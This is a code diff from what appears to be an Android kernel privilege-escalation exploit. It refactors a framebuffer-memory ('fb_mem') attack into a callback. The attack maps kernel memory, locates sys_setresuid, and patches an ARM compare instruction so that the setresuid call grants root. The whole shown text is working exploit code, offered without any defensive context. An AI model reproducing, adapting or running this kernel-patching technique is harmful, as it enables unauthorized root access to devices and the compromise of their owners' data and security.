@@ -166,34 +166,20 @@ attempt_diag_exploit(unsigned long int sys_setresuid_address)
 
 static uint32_t cmp_operation_code = 0xe3500000;
 static bool
-attempt_fb_mem_exploit(void)
+fb_mem_exploit_callback(void *mmap_base_address, void *user_data)
 {
   int ret;
-  int fd;
-  void *mapped_address;
   void *mapped_sys_setresuid_address;
   unsigned long int sys_setresuid_address = 0;
   int *cmp_operation;
 
-  printf("Attempt fb mem exploit...\n");
-
-  mapped_address = fb_mem_mmap(&fd);
-  if (mapped_address == MAP_FAILED) {
-    printf("Failed to mmap due to %s\n", strerror(errno));
-
-    fb_mem_munmap(mapped_address, fd);
-    return false;
-  }
-
-  sys_setresuid_address = get_sys_setresuid_address_in_memory(mapped_address);
+  sys_setresuid_address = get_sys_setresuid_address_in_memory(mmap_base_address);
   if (!sys_setresuid_address) {
     printf("Failed to get sys_setresuid address due to %s\n", strerror(errno));
-
-    fb_mem_munmap(mapped_address, fd);
     return false;
   }
 
-  mapped_sys_setresuid_address = fb_mem_convert_to_mmaped_address((void*)sys_setresuid_address, mapped_address);
+  mapped_sys_setresuid_address = fb_mem_convert_to_mmaped_address((void*)sys_setresuid_address, mmap_base_address);
   cmp_operation = memmem(mapped_sys_setresuid_address, 0x100, &cmp_operation_code, sizeof(cmp_operation_code));
 
   if (*cmp_operation == cmp_operation_code) {
@@ -204,9 +190,15 @@ attempt_fb_mem_exploit(void)
 
   *cmp_operation = cmp_operation_code;
 
-  fb_mem_munmap(mapped_address, fd);
-
   return (ret == 0);
+}
+
+static bool
+attempt_fb_mem_exploit(void)
+{
+  printf("Attempt fb mem exploit...\n");
+
+  return fb_mem_run_exploit(fb_mem_exploit_callback, NULL);
 }
 
 static bool
